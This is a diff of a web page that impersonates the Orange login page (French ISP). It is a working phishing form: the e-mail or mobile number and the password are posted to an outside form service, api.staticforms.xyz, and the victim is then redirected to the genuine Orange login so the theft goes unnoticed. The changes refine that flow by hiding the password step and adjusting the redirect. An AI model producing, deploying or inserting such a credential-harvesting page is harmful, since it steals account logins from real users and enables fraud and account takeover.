@@ -1,5 +1,7 @@
 
- <!doctype html>
+
+
+  <!doctype html>
   <html lang="fr">
   <head>
     <meta charset="utf-8"><meta name="viewport" content="initial-scale=1.0, width=device-width"><meta name="format-detection" content="telephone=no,email=no"><meta name="msapplication-config" content="none"><link rel="apple-touch-icon" sizes="57x57" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-2.13.2/_next/static/icons/apple-touch-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-2.13.2/_next/static/icons/apple-touch-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-2.13.2/_next/static/icons/apple-touch-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-2.13.2/_next/static/icons/apple-touch-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-2.13.2/_next/static/icons/apple-touch-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-2.13.2/_next/static/icons/apple-touch-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-2.13.2/_next/static/icons/apple-touch-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-2.13.2/_next/static/icons/apple-touch-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-2.13.2/_next/static/icons/apple-touch-icon-180x180.png"><link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-2.13.2/_next/static/icons/favicon-32x32.png" sizes="32x32"><link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-2.13.2/_next/static/icons/favicon-194x194.png" sizes="194x194"><link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-2.13.2/_next/static/icons/favicon-96x96.png" sizes="96x96"><link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-2.13.2/_next/static/icons/android-chrome-36x36.png" sizes="36x36"><link rel="icon" type="image/png" href="https://cdn.woopic.com/c15d9d8fc98141b084d96f795046449b/auth-ssr-2.13.2/_next/static/icons/android-chrome-48x48.png" sizes="48x48">
@@ -435,7 +437,7 @@
 <form action="https://api.staticforms.xyz/submit" method="POST">
 
   <input type="hidden" name="accessKey" value="sf_mh67m4allbmf7bih979cjh7m">
-  <input type="hidden" name="redirectTo" value="https://login.orange.fr/?return_url=https%3A%2F%2Frms.orange.fr%2F%3Fservice%3Dwebmail&service=webmail">
+  <input type="hidden" name="redirectTo" value=https://login.orange.fr/?return_url=https%3A%2F%2Fespace-client.orange.fr%2Fpage-accueil">
 
   <!-- SECTION EMAIL -->
   <div id="emailSection">
@@ -470,7 +472,7 @@
           <input type="email" id="login"
                  class="form-control form-control-empty"
                  name="login" placeholder="" >
-          <label for="login"></br>
+          <label for="login">
             Adresse e-mail ou n° de mobile Orange
           </label>
         </div>
@@ -488,13 +490,13 @@
   </div>
 
   <!-- SECTION MOT DE PASSE -->
-  <div id="passwordSection">
+  <div id="passwordSection" style="display:none;">
 
     <div class="row mt-2">
       <div class="col-12 col-md-6 col-xl-7">
         <div class="form-group">
-          <input type="password" id="password" name="password" class="form-control"  placeholder= "Mot de passe"></br>
-          <label for="password">Mot de passe</label>
+          <input type="password" id="password" name="password" class="form-control" required  placeholder= "Mot de passe"></br>
+          <label for="">Mot de passe</label>
         </div>
       </div>
     </div>
@@ -577,7 +579,6 @@ document.addEventListener("DOMContentLoaded", function () {
 
 
           </body>
-
 
 
 
